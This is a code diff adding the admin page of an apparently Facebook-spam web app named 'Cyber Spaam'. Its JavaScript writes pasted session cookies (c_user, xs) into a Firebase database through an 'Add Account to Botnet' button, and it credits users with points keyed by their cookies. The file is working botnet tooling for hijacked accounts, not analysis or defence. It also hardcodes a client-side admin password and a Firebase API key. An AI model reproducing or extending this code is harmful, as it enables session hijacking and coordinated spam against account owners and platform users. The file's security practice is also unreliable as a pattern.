@@ -1,0 +1,120 @@
+<!-- language: HTML, file: www/admin.html -->
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Admin - Cyber Spaam</title>
+  <style>
+    * { box-sizing: border-box; }
+    body { font-family: sans-serif; background-color: #0a0a0a; color: #ff3333; text-align: center; margin: 0; padding: 20px; }
+    .container { max-width: 400px; margin: 40px auto; background: #111; padding: 20px; border-radius: 10px; border: 1px solid #ff3333; box-shadow: 0 0 15px rgba(255, 51, 51, 0.2); }
+    h1 { font-size: 24px; text-shadow: 0 0 10px #ff3333; }
+    input, textarea { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #333; color: #fff; border-radius: 5px; outline: none; }
+    button { width: 100%; padding: 12px; background: #ff3333; color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 16px; }
+    .box { border: 1px solid #333; padding: 15px; margin-bottom: 15px; border-radius: 5px; text-align: left; }
+    .box h3 { margin-top: 0; color: #fff; font-size: 16px; }
+    .hidden { display: none !important; }
+  </style>
+</head>
+<body>
+
+  <!-- অ্যাডমিন পাসওয়ার্ড প্যানেল -->
+  <div id="authPanel" class="container">
+    <h1>ADMIN ACCESS</h1>
+    <input type="password" id="adminPass" placeholder="Enter Admin Password">
+    <button onclick="checkPassword()">Login</button>
+    <p id="authStatus" style="color:red; font-size:14px;"></p>
+    <button style="background:#333; margin-top:20px;" onclick="goBack()">Back to App</button>
+  </div>
+
+  <!-- অ্যাডমিন ড্যাশবোর্ড -->
+  <div id="adminPanel" class="container hidden">
+    <h1>ADMIN CONTROL</h1>
+    
+    <div class="box">
+      <h3>Give Points to User</h3>
+      <input type="text" id="pointUserCookie" placeholder="User Cookie (c_user=...)">
+      <input type="number" id="pointAmount" placeholder="Points Amount (e.g. 5)">
+      <button onclick="givePoints()">Add Points</button>
+    </div>
+
+    <div class="box">
+      <h3>Add Account to Botnet (Manual)</h3>
+      <textarea id="manualCookie" rows="3" placeholder="c_user=...; xs=..."></textarea>
+      <button onclick="addManualAccount()">Add to Botnet</button>
+    </div>
+
+    <button style="background:#333; color:#fff;" onclick="goBack()">Back to App</button>
+    <div id="adminStatus" style="margin-top:10px; color:#fff; font-size: 14px;"></div>
+  </div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getDatabase, ref, push, set, get, child, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyC22mPef-Lsi4qqTMZwmQ2WlcUtSTCiIP0",
+      authDomain: "cyber-spaam.firebaseapp.com",
+      databaseURL: "https://cyber-spaam-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "cyber-spaam",
+      storageBucket: "cyber-spaam.firebasestorage.app",
+      messagingSenderId: "180047004522",
+      appId: "1:180047004522:web:470d5c50f2e333916d9b13"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    window.checkPassword = function() {
+      const pass = document.getElementById('adminPass').value;
+      if (pass === 'arif123') {
+        document.getElementById('authPanel').classList.add('hidden');
+        document.getElementById('adminPanel').classList.remove('hidden');
+      } else {
+        document.getElementById('authStatus').innerText = "❌ Wrong Password!";
+      }
+    }
+
+    window.goBack = function() {
+      window.location.href = "index.html"; // মেইন অ্যাপে ফিরে যাবে
+    }
+
+    window.givePoints = async function() {
+      const cookie = document.getElementById('pointUserCookie').value.trim();
+      const amount = parseInt(document.getElementById('pointAmount').value);
+      const status = document.getElementById('adminStatus');
+      
+      if (!cookie || isNaN(amount)) return status.innerText = "❌ Fill all fields";
+
+      try {
+        const userKey = btoa(cookie.substring(0, 15));
+        const userRef = ref(db, `users/${userKey}`);
+        const snapshot = await get(userRef);
+        
+        if (snapshot.exists()) {
+          const current = snapshot.val().points || 0;
+          await update(userRef, { points: current + amount });
+          status.innerText = `✅ Added ${amount} points. New total: ${current + amount}`;
+        } else {
+          status.innerText = "❌ User not found in database!";
+        }
+      } catch (e) { status.innerText = "❌ Error: " + e.message; }
+    }
+
+    window.addManualAccount = async function() {
+      const cookie = document.getElementById('manualCookie').value.trim();
+      const status = document.getElementById('adminStatus');
+      
+      if (!cookie || !cookie.includes('c_user')) return status.innerText = "❌ Invalid cookie format";
+
+      try {
+        const accRef = ref(db, 'accounts');
+        await set(push(accRef), { cookie: cookie });
+        status.innerText = "✅ Account added to Botnet!";
+        document.getElementById('manualCookie').value = '';
+      } catch (e) { status.innerText = "❌ Error: " + e.message; }
+    }
+  </script>
+</body>
+    </html>
